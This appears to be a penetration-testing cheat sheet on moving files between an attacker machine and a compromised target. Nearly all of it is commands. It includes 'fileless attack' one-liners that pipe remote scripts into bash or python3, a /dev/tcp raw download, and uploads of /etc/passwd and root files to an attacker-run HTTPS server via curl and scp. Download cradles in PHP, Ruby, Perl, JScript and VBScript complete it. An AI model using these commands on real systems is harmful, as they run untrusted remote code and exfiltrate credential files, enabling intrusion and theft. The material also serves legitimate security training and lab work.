== DOWNLOADS ==

BASE64 ENCODE -> DECODE
confirm the hash:
md5sum file.txt

encode to base64:
cat file.txt | base64 -w 0; echo
(copy output)


then you can decode the file:
echo -n '<base64_string_here>' | base64 -d > file.txt

confirm the md5:
md5sum file.txt



FILELESS ATTACKS:
curl <https://bashattack.com/bashattack.sh> | bash

wget -q0- <https://pythonattack.com/pythonattack.py> | python3


DOWNLOADING W/ BASH ONLY:
exec 3<>/dev/tcp/<webserverip>/<http.server-port>
echo -e "GET /<filename.sh> HTTP/1.1\n\n">&3
cat <&3


USING SSH:
sudo systemctl enable ssh (if not already enabled)
sudo systemctl start ssh

download via scp:
scp username@<target-ip>:</path/to/file.txt> .

example:
scp root@10.10.15.13:/root/myroot.txt .


== UPLOADS ==

WEB SERVER UPLOAD (webserver on host, then target uploads to host):
start server on host:
sudo python3 -m pip install --user uploadserver

create a self-signed certificate:
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

start the webserver:
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

target uploads files to webserver:
curl -X POST https://<host-ip>/upload -F 'files=@/etc/passwd' -F 'files=@/root/somethingg.txt' --insecure


Alternative webserver starts:
python3 -m http.server
python2.7 -m SimpleHTTPServer
php -S 0.0.0.0:8000
ruby -run -ehttpd . -p8000

then use wget <webserver>:8000/file.txt


SCP UPLOAD:
scp /etc/passwd <hostname>@<host-ip>:/home/user/



PROGRAM-SPECIFIC CODE TRANSFER:
on target {to download}:
python3 -c 'import urllib;urllib.urlretrieve ("http://<host-ip>:<port>/<filename.txt>", "<filename.txt>")'
[can also use python2.7]

php -r '$file = file_get_contents("http://<host-ip>:<port>/<filename.txt>"); file_put_contents("<filename.txt>",$file);'

php -r 'const BUFFER = 1024; $fremote = 
fopen("http://<host-ip>:<port>/<filename.txt>", "rb"); $flocal = fopen("<filename.txt>", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

PHP piped into bash:
php -r '$lines = @file("http://<host-ip>:<port>/<filename.sh>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash

RUBY:
ruby -e 'require "net/http"; File.write("<filename.txt>", Net::HTTP.get(URI.parse("http://<host-ip>:<port>/<filename.txt>")))'

PERL:
perl -e 'use LWP::Simple; getstore("http://<host-ip>:<port>/<filename.txt>", "<filename.txt>");'

JAVASCRIPT:
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));

CSCRIPT TRIGGERING JAVASCRIPT:
cscript.exe /nologo wget.js http://<host-ip>:<port>/<filename.txt> <filename.txt>

CSCRIPT TRIGGERING VBSCRIPT:
cscript.exe /nologo wget.vbs http://<host-ip>:<port>/<filename.txt> <filename.txt>

VBScript:
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send
with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
